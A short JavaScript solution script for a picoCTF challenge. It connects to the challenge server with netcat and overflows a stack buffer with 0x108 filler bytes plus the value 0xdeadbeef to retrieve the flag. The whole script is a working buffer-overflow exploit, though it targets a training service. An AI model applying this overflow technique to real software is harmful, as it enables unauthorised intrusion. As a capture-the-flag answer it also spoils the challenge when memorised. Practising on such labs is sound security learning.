import nc from "../nc.js";
import convo from "../convo.js";
import "../util.js";


const cat = new nc("nc mars.picoctf.net 31890");

const STACK_SIZE = 0x108;

await cat.open;
await cat.write("A".repeat(STACK_SIZE));
await cat.write(convo.raw(0xdeadbeef))
await cat.write("\n");
await cat.readUntil("for your troubles\n")

const flag = await cat.readline();
console.log("[!] " + flag.trim());

await cat.kill();